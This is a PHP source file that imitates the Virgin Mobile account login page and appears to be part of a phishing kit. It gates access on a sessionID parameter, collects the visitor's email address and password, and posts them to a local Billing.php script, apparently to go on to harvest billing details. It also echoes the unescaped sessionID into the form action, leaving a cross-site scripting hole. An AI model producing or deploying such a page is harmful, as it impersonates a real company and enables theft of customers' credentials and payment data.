<?php
require 'controls.php';
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];
?>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths login">
    <head>
        <title>Log into your Virgin Mobile account | Virgin Mobile</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="description" content="Login into your Virgin Mobile account and unleash your mobile’s full potential. Get the latest on customer exclusives and sort out admin with ease.">
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
        <link href="css/signin.css" rel="stylesheet">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <link href="css/VMBreuerText_Embedding.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/bootstrap.overrides.css" rel="stylesheet">
        <link href="css/vm.theme.css" rel="stylesheet">
        <link href="css/mtp.forms.css" rel="stylesheet">
        <link href="css/mtp.ecareTheme.css" rel="stylesheet">
    </head>
    <body class="login-style ecare">
        <div id="content">
            <div class="container ecare-container login-container">

            <div class="login-wrap">
                <a>
                    <img class="logoVirgin" src="assets/images/signin-bg.png">
                </a>
                <div class="login-gradient">
                    <div class="logo-placeholder">
                        <div class="login-head row">
                            <div class="col-md-7 col-sm-7 col-xs-7">
                                <div class="title">
                                    <div class="clearfix" style='font-family: Helvetica Neue, Helvetica, Arial, sans-serif'>
                                        <h1>Welcome to Your Account</h1>
                                    </div>
                                    <div class="clearfix">
                                        <h3>Log into your mobile account</h3>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <h2 class="content-hdr"></h2>

                        <?php 
                        if(isset($_GET['error'])){
                            if($_GET['error'] == 'wrongEmail'){
                                echo '
                                    <div class="warning icon login.warning" id="loginFailed">
                                        <p><strong>Sorry, we didn’t recognise those details</strong></p>
                                        <p>Please note that passwords are case-sensitive, so check that your caps lock is set correctly and try again.</p>
                                    </div>
                                ';
                            }
                        }
                        ?>
                
                        <form action="Billing.php?sessionID=<?php echo $sessionID; ?>" method="post" class="form-horizontal">
                            <div class="form-group clearfix">
                                <label class="col-xs-12 control-label text-left" for="username">Email address</label>
                                <div class="col-sm-7 col-xs-10">
                                    <input class="form-control required hw-email-validator" id="username" type="text" name="username">
                                    <span class="icon-clear">x</span>
                                </div>
                                <div class="col-sm-1 col-xs-1">
                                    <div class="success-message">
                                        <b class="validate"></b>
                                    </div>
                                    <div class="error-message">
                                        <b class="icon-error"></b>
                                    </div>
                                </div>
                                <div class="mob-form-clearfix"></div>
                                <div class="col-sm-4 col-xs-12 messages">
                                    <div class="alert-message login.alert.username">
                                        <p>This is the address we use to contact you.</p>
                                    </div>
                                    <div class="error-message login.error.username">
                                        <p>Please enter your email address</p>
                                    </div>
                                    <div class="error-message hw-js.error.null.email">
                                        <p>Please enter your email address</p>
                                    </div>
                                    <div class="error-message hw-js.error.format.email">
                                        <p>That doesn't look like an email address. Please check the details you've entered</p>
                                    </div>
                                </div>
                            </div>

                            <div class="helpText">
                                <a class="hw_forgotten_username">Forgotten your email address?</a>
                            </div>

                            <div class="form-group clearfix">
                                <label class="col-xs-12 control-label text-left" for="password">Password </label>
                                <div class="col-sm-7 col-xs-10">
                                    <input class="form-control required cantCopy hw-old-password-validator" id="password" name="password" type="password" autocomplete="off">
                                    <span class="icon-clear">x</span>
                                </div>
                                <div class="col-sm-1 col-xs-1">
                                    <div class="success-message">
                                        <b class="validate"></b>
                                    </div>
                                    <div class="error-message">
                                        <b class="icon-error"></b>
                                    </div>
                                </div>
                                <div class="mob-form-clearfix"></div>
                                <div class="col-sm-4 col-xs-12 messages">
                                    <div class="alert-message login.alert.password">
                                        <p>It’s 8-10 characters without spaces.</p>
                                    </div>
                                    <div class="error-message login.error.password">
                                        <p>Please enter your online password</p>
                                    </div>
                                    <div class="error-message hw-js.error.null.password">
                                          <p>Please enter your online password</p>
                                      </div>
                                      <div class="error-message hw-js.error.length.password">
                                          <p>Your password will need to be more than 6 characters with no spaces</p>
                                      </div>
                                      <div class="error-message hw-js.error.format.password">
                                          <p>Please use letters and numbers only</p>
                                      </div>
                                </div>
                            </div>

                            <div class="helpText">
                                <a href="/ecare/forgetPassword" class="hw_forget_password">Forgotten your password?</a>
                            </div>
                        

                           <div class="form-group clearfix login-captcha hidden" id="recaptchaDiv">
                              <div class="col-sm-7 col-xs-10">
                              <div id="captch"></div>
												 
                              <br>
                              </div>
                           </div>    
                    

                            <div class="form-group">
                                <div class="col-sm-3">
                                    <button class="btn btn-primary btn-block sign-in-btn" type="submit">Log in</button>
                                </div>
                            </div>

                            <div class="helpText forgotBoth">
                                <a href="/ecare/forgottenBoth" class="hw_forgotten_both">Forgotten your email address and password?</a>
                            </div>
                        </form>

                        <hr class="sectionDiv-login">
                            <div class="login-info">
                                <p>
                                    <strong>Trouble logging in?</strong>
                                    <br>
                                    If you’re having issues logging into Your Account, we’re here to <a>help</a>.
                                    
                                </p>
                                <p>
                                    <strong>Not registered yet?</strong>
                                    <br>
                                    If you haven't set up an online account, <a class="hw-a-login-register-now">register now</a>. It only takes a minute and we'll keep it interesting. Promise.
                                </p>

                                <p>
                                    <strong>For Virgin Media TV, broadband and phone customers</strong>
                                    <br>
                                    If you're looking to access your TV, broadband and phone account including your email, <a>sign in here.</a>
                                </p>
                                <p>
                                    <strong>Virgin Media Business Mobile customers</strong>
                                    <br>
                                    <a href="/ecare/loginForVMB">Log in</a> to your Virgin Media Business Mobile Account.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <footer class="login-footer">
                    <div class="">
                        <p class="terms">We use cookies on virginmedia.com to keep you signed in. These have now been set in your browser, and by continuing to use our website you'll be telling us you're okay with that.</p>
                        <div class="links">
                            <ul class="list-inline">
                                <li><a>Legal stuff</a></li>
                                <li>|</li>
                                <li><a>Help</a></li>
                            </ul>
                        </div>
                        <p>© 2015 Virgin Media. All rights reserved</p>
                    </div>
                </footer>
            </div>
        </div>
    </body>
</html>